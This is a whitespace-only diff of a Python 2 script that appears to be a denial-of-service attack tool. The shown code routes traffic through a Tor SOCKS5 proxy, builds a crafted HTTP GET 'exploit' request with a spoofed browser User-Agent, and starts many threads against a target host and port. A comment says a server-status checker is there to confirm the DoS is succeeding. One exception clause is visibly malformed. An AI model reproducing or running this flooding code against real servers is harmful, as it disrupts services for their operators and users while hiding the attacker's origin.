@@ -13,13 +13,13 @@ parser.add_argument('-m', default='slow', help="Method. 1: slowget, 2: flood")
 args = parser.parse_args()
 
 
-    
+
 try:
     socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", int(args.tp))
 except e as Exception:
     print "Error: Tor port is not an integer."
     exit(1)
-    
+
 exploit = ("GET / HTTP/1.1\r\n"
            "Host: %s\r\n"
            "User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:38.0) Gecko/20100101 Firefox/38.0\r\n"
@@ -111,7 +111,7 @@ for x in range(0,int(args.t)):
         print 'Thread: '+str(x+1)+' started.'
     except:
       thread.start_new_thread(recon, (args.s, int(args.p), exploit))
-        
+
 print 'threads started.'
 time.sleep(2)
 print "initiating server status checker." #Here we repeatedly check the server status in order to know weather or not our DoS is succeeding.
